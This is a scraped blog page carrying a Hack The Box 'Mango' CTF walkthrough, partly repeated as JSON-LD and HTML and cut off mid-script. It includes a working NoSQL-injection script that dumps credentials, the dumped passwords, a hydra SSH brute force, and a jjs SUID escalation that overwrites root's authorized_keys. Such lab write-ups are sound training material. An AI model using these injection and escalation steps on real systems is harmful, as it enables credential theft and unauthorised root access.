| tls-alpn: |_ http/1.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 54.48 seconds Enumeration (1) Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. As for the http service, maybe we can find some information on it ? Forbidden… Bruteforcing the directory and pages also returned no results :( Lets see if the https service has something for us? Looks like a copycat of Google’s search engine! But unfortunately it does nothing at all. However, clicking on the “Analytics” button brought us to another page. The content seems to be from some external websites, which happen to be out of our scope so we can ignore this :) If we check our nmap results again and look closely at the ssl-cert information under port 443, we realise that there is a subdomain under mango.htb: staging-order.mango.htb. Viewing the certificate via the browser also shows the same domain name. Lets add staging-order.mango.htb to our /etc/hosts and see if that changes anything. 1 2 3 $ cat /etc/hosts ... 10.10.10.162 mango.htb staging-order.mango.htb Entering https://staging-order.mango.htb into the browser shows a login screen! At this time I was kinda stuck because I had no credentials to test with and I even tried using SQL injection, but to no avail :( I decided to consult the forums and got a hint that to think about what database the web app was using and how it relates to the name of this box aka Mango. So I enterd “mango db” into Google and saw this: I went on to search for MongoDB injection and found this. I then tried to login with some credentials and used Burp Suite to intercept the request. I then modified the request body parameters: And got redirected to /home.php! Seems like the web app is vulnerable to NoSQL injections! I then made a script to help me automate the dumping out of the credentials in the database: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 import requests import string from urllib import quote_plus import re VALID_CHARS = string.printable URL = &quot;http://staging-order.mango.htb/&quot; HEADERS = {&#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;} MAX_FIELD_LENGTH = 255 def check_valid(payload): &quot;&quot;&quot;This function returns True if the request results in a successful login&quot;&quot;&quot; return requests.post(URL, data=payload,headers=HEADERS, allow_redirects=False).headers.get(&#39;location&#39;, &#39;&#39;) == &#39;home.php&#39; def enumerate_usernames(): &quot;&quot;&quot;This function returns a list of usernames extracted&quot;&quot;&quot; list_of_usernames = [] valid_username_lengths = get_username_lengths() for user_len in valid_username_lengths: list_of_usernames += get_usernames(user_len) return list_of_usernames def get_username_lengths(): &quot;&quot;&quot;This function returns a list containing the various lengths of the usernames&quot;&quot;&quot; test_username_length_format = &quot;username[$regex]=^.{{{}}}$&amp;password[$ne]=something&amp;login=login&quot; valid_username_lengths = [] for i in xrange(1, FIELD_LENGTH + 1): payload = test_username_length_format.format(i) print(&quot;[*] Testing for username length: {}&quot;.format(i)) if check_valid(payload): # print(&quot;[*] Username length found: {}&quot;.format(i)) valid_username_lengths.append(i) return valid_username_lengths def get_usernames(length): &quot;&quot;&quot;This function returns a list of usernames of the given length&quot;&quot;&quot; usernames = set() test_username_format = &quot;username[$regex]=^{}.*$&amp;password[$ne]=something&amp;login=login&quot; while True: username = &quot;&quot; for idx in range(length): for i in VALID_CHARS: tmp = username + i print &quot;[*] Testing for username: {}&quot;.format(tmp) payload = test_username_format.format(tmp) if check_valid(payload): username = tmp break if username and username not in usernames: test_username_format += &quot;&amp;username[$ne]={}&quot;.format(username) usernames.add(username) print(&quot;[*] Username found: {}&quot;.format(username)) else: break return list(usernames) def get_password_length(username): &quot;&quot;&quot;This function returns the length of the password corresponding to the given username&quot;&quot;&quot; test_password_length_format = &quot;username={}&amp;password[$regex]=^.{{{}}}$&amp;login=login&quot; for i in xrange(1, FIELD_LENGTH + 1): print(&quot;[*] Testing for password length: {}&quot;.format(i)) payload = test_password_length_format.format(username, i) if check_valid(payload): return i def get_password(username): &quot;&quot;&quot;This function returns the password corresponding to the given username&quot;&quot;&quot; test_password_format = &quot;username={}&amp;password[$regex]=^{}.*$&amp;login=login&quot; password = &quot;&quot; for idx in range(get_password_length(username)): for i in VALID_CHARS: tmp = password + i print(&quot;[*] Testing for password: {}&quot;.format(tmp)) payload = test_password_format.format(username, quote_plus(re.escape(tmp))) if check_valid(payload): password = tmp print(&quot;[*] Password found: {}&quot;.format(password)) break return password def main(): &quot;&quot;&quot;This is the main function&quot;&quot;&quot; user_list = enumerate_usernames() for username in user_list: password = get_password(username) print(&quot;[*] Found {}:{}&quot;.format(username, password)) if __name__ == &quot;__main__&quot;: main() It takes a while to run (perhaps optimize using binary search?), but we managed to dump out 2 sets of credentials: 1 2 [*] Found admin:t9KcS3&gt;!0B#2 [*] Found mango:h3mXK8RhU~f{]f5H The web app doesn’t seem to have any other functionality that we can exploit so lets see if we can try using these credentials on the ssh service! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ cat user.txt admin mango $ cat pass.txt t9KcS3&gt;!0B#2 h3mXK8RhU~f{]f5H $ hydra -L user.txt -P pass.txt ssh://mango.htb Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-18 15:17:36 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:2/p:2), ~1 try per task [DATA] attacking ssh://mango.htb:22/ [22][ssh] host: mango.htb login: mango password: h3mXK8RhU~f{]f5H 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-18 15:17:41 Using this set of credentials, we can ssh into the box: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ ssh mango@mango.htb mango@mango.htb&#39;s password: mango@mango:~$ ls -al total 44 drwxr-xr-x 6 mango mango 4096 Apr 18 19:04 . drwxr-xr-x 4 root root 4096 Sep 27 2019 .. lrwxrwxrwx 1 mango mango 9 Sep 27 2019 .bash_history -&gt; /dev/null -rw-r--r-- 1 mango mango 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 mango mango 3771 Apr 4 2018 .bashrc drwx------ 2 mango mango 4096 Sep 28 2019 .cache -rw------- 1 mango mango 14 Apr 18 16:34 .dbshell drwx------ 3 mango mango 4096 Apr 18 18:23 .gnupg drwxrwxr-x 3 mango mango 4096 Apr 18 16:29 .local -rw------- 1 mango mango 0 Apr 18 16:34 .mongorc.js -rw-r--r-- 1 mango mango 807 Apr 4 2018 .profile drwx------ 2 mango mango 4096 Apr 18 18:31 .ssh -rw------- 1 mango mango 858 Apr 18 19:04 .viminfo Where’s the user.txt? Lets see if there are any other possible users on the box. 1 2 3 4 5 6 mango@mango:~$ ls -al /home total 16 drwxr-xr-x 4 root root 4096 Sep 27 2019 . drwxr-xr-x 23 root root 4096 Sep 27 2019 .. drwxr-xr-x 4 admin admin 4096 Apr 18 19:26 admin drwxr-xr-x 6 mango mango 4096 Apr 18 19:04 mango Seems like admin has the user.txt! user.txt Using su and the admin credentials we found in the web app database, we are able to login as admin. 1 2 3 4 mango@mango:~$ su admin Password: $ whoami admin Getting the flag was a piece of cake: 1 2 $ cat ~/user.txt 79bfXXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration(2) As usual, I will use LinEnum to enumerate for ways to escalate to root. Spawning web server: 1 2 3 4 5 $ mkdir httpserver $ cd httpserver $ cp ~/LinEnum.sh . $ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Retrieving the script: 1 2 3 4 5 6 7 8 9 10 11 $ cd /tmp $ wget http://10.10.XX.XX/LinEnum.sh --2020-04-18 20:04:09-- http://10.10.XX.XX/LinEnum.sh Connecting to 10.10.14.217:80... connected. HTTP request sent, awaiting response... 200 OK Length: 46476 (45K) [text/x-sh] Saving to: ‘LinEnum.sh’ LinEnum.sh 100%[====================================================================================================&gt;] 45.39K 78.8KB/s in 0.6s 2020-04-18 20:04:10 (78.8 KB/s) - ‘LinEnum.sh’ saved [46476/46476] Running the script: 1 2 3 4 5 $ chmod +x LinEnum.sh $ ./LinEnum.sh ... [+] Possibly interesting SUID files: -rwsr-sr-- 1 root admin 10352 Jul 18 2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs Alright, we can use this executable to escalate our privileges! With the SUID bit set on the file, we can execute jjs as if we are root. According to GTFOBins, we are able to spawn an interactive shell with elevated permissions: 1 2 3 4 5 $ cd /usr/lib/jvm/java-11-openjdk-amd64/bin/ $ echo &quot;Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;).waitFor()&quot; | ./jjs Warning: The jjs tool is planned to be removed from a future JDK release jjs&gt; Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;/bin/sh -pc $@|sh${IFS}-p _ echo sh -p &lt;/dev/pts/0 &gt;/dev/pts/0 2&gt;/dev/pts/0&#39;).waitFor() # Unfortunately, it did spawn but it just hung there :( So we gotta think of an alternative way to get root shell. I tried to spawn a reverse shell back to my listener but it didn’t work. However, I realised that I was able to perform very simple commands like “cp” and “mv” but no piping or redirection. So how about we write to root’s authorized_keys file? 1 2 3 4 5 # cat /etc/ssh/sshd_config ... PermitRootLogin yes ... AllowUsers mango root root.txt From the above config, we can confirm that we are able to ssh directly into the box as root. To do so, first we’ll need to generate a SSH keypair. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ssh-keygen -t rsa Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /root/.ssh/id_rsa. Your public key has been saved in /root/.ssh/id_rsa.pub. The key fingerprint is: SHA256:TEPWxxvFEd9AoEM+xQGEYHHyVHuUeSugqKuFihcLCf4 root@kali The key&#39;s randomart image is: +---[RSA 3072]----+ | =o===+=O*o | | . B.oo=B oo.| | .+.*o.+ .o| |. .o.. +o . | |o. . S . | |o.... | | .oo.. | |..oE. | |o... | +----[SHA256]-----+ Open the public key/root/.ssh/id_rsa.pub and copy the contents into your clipboard. Echo it into a file in the tmp directory. 1 # echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXGz/VwVW7AUU35k3HgAjJ7aYLCgE9miz7g4XvCsB+Bk/0NpQWIcd4PUXe4JSe0CK5Dgj2F5LVnKd6s87HN0v0s8RUcsDEKsnwYhIrHmL8G2nYgEl0Pixj7u67lHJbs1pCFfMP4Aj0pJzUoCHhroqXpkdj6P8/FHUnBKntyo51BXzqemUNrif3joCNF/AbQUTPBFMAHmciN2huxU8Q1E8vmVR3SXZbmKw4ZX8wj8sf49hJDCNm2qpiVNyB4nS8KaShMP69ya0mH9ynF2P0YF4nJJlbHcO/j9jvbK5NNMYQSl/xmyL+9okjExiXFH0yQulpDKWsnZv6s8N9K3ASwWIsyavxc7B1UnqOp2elLuRgLI/3QL5XXEEU+l7s/MJ5l9LTvSWBS4m2e1Xqlye41AJAE38p8qq0wX9q3AefEHlOnOcn5XiQQ9H37cx6dayf9B+gKim1G/KycAiURD8Q/+cNs9KCuS9p8gTdReA9ZMSLQ5dXV+tHd06ENAAPYY/HH58= root@kali&quot; &gt; /tmp/secret And now overwrite the root’s authorized_keys file! 1 $ echo &quot;Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;cp /tmp/secret /root/.ssh/authorized_keys&#39;).waitFor()&quot; | ./jjs Now, we are able to ssh into the root account using our private key /root/id_rsa: 1 2 3 4 $ ssh -i /root/id_rsa root@mango.htb ... root@mango:~# cat root.txt 8a8eXXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !","url":"https://rizemon.github.io/posts/mango-htb/","@type":"BlogPosting","headline":"Hack The Box - Mango","dateModified":"2021-01-03T20:34:47+08:00","datePublished":"2020-04-19T05:00:00+08:00","@context":"https://schema.org"}</script><title>Hack The Box - Mango | rizemon's blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/portfolio.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">rizemon's blog</a></div><div class="site-subtitle font-italic">Cyber Security Enthusiast.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/rizemon" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/rizemon" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - Mango</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - Mango</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Apr 19, 2020, 5:00 AM +0800" > Apr 19, 2020 <i class="unloaded">2020-04-19T05:00:00+08:00</i> </span> by <span class="author"> rizemon </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 3, 2021, 8:34 PM +0800" > Jan 3, 2021 <i class="unloaded">2021-01-03T20:34:47+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1965 words">10 min</span></div></div><div class="post-content"><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/mango.png" alt="" height="414px" width="615px" /></p><h1 id="configuration">Configuration</h1><p>The operating systems that I will be using to tackle this machine is a Kali Linux VM.</p><p>What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.10.10.162 mango.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
</pre></table></code></div></div><h1 id="reconnaissance">Reconnaissance</h1><p>Using <code class="language-plaintext highlighter-rouge">nmap</code>, we are able to determine the open ports and running services on the machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sT</span> <span class="nt">-sC</span> mango.htb
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-01-17 13:05 EST
Nmap scan report <span class="k">for </span>mango.htb <span class="o">(</span>10.10.10.162<span class="o">)</span>
Host is up <span class="o">(</span>0.26s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 <span class="o">(</span>RSA<span class="o">)</span>
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp  open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: 403 Forbidden
443/tcp open  ssl/ssl Apache httpd <span class="o">(</span>SSL-only mode<span class="o">)</span>
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: 400 Bad Request
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>staging-order.mango.htb/organizationName<span class="o">=</span>Mango Prv Ltd./stateOrProvinceName<span class="o">=</span>None/countryName<span class="o">=</span>IN
| Not valid before: 2019-09-27T14:21:19
|_Not valid after:  2020-09-26T14:21:19
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>54.48 seconds

</pre></table></code></div></div><h1 id="enumeration-1">Enumeration (1)</h1><p>Not much can be done with the <code class="language-plaintext highlighter-rouge">ssh</code> service as we do not have any credentials on hand so lets come back to it later. As for the <code class="language-plaintext highlighter-rouge">http</code> service, maybe we can find some information on it ?</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/mango1.png" alt="" /></p><p><code class="language-plaintext highlighter-rouge">Forbidden</code>… Bruteforcing the directory and pages also returned no results :( Lets see if the <code class="language-plaintext highlighter-rouge">https</code> service has something for us?</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/mango2.png" alt="" /></p><p>Looks like a copycat of Google’s search engine! But unfortunately it does nothing at all. However, clicking on the “Analytics” button brought us to another page.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/mango3.png" alt="" /></p><p>The content seems to be from some external websites, which happen to be out of our scope so we can ignore this :)</p><p>If we check our <code class="language-plaintext highlighter-rouge">nmap</code> results again and look closely at the <code class="language-plaintext highlighter-rouge">ssl-cert</code> information under port 443, we realise that there is a subdomain under <code class="language-plaintext highlighter-rouge">mango.htb</code>: <code class="language-plaintext highlighter-rouge">staging-order.mango.htb</code>. Viewing the certificate via the browser also shows the same domain name.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/mango4.png" alt="" /></p><p>Lets add <code class="language-plaintext highlighter-rouge">staging-order.mango.htb</code> to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> and see if that changes anything.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> /etc/hosts
...
10.10.10.162 mango.htb staging-order.mango.htb
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/mango5.png" alt="" /></p><p>Entering <code class="language-plaintext highlighter-rouge">https://staging-order.mango.htb</code> into the browser shows a login screen!</p><p>At this time I was kinda stuck because I had no credentials to test with and I even tried using <code class="language-plaintext highlighter-rouge">SQL injection</code>, but to no avail :( I decided to consult the forums and got a hint that to think about what database the web app was using and how it relates to the name of this box aka <code class="language-plaintext highlighter-rouge">Mango</code>. So I enterd “mango db” into Google and saw this:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/mango6.png" alt="" /></p><p>I went on to search for <code class="language-plaintext highlighter-rouge">MongoDB injection</code> and found <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection">this</a>. I then tried to login with some credentials and used <code class="language-plaintext highlighter-rouge">Burp Suite</code> to intercept the request. I then modified the request body parameters:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/mango7.png" alt="" /></p><p>And got redirected to <code class="language-plaintext highlighter-rouge">/home.php</code>!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/mango8.png" alt="" /></p><p>Seems like the web app is vulnerable to <code class="language-plaintext highlighter-rouge">NoSQL</code> injections! I then made a script to help me automate the dumping out of the credentials in the database:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="n">quote_plus</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="n">VALID_CHARS</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">printable</span>
<span class="n">URL</span> <span class="o">=</span> <span class="s">"http://staging-order.mango.htb/"</span>
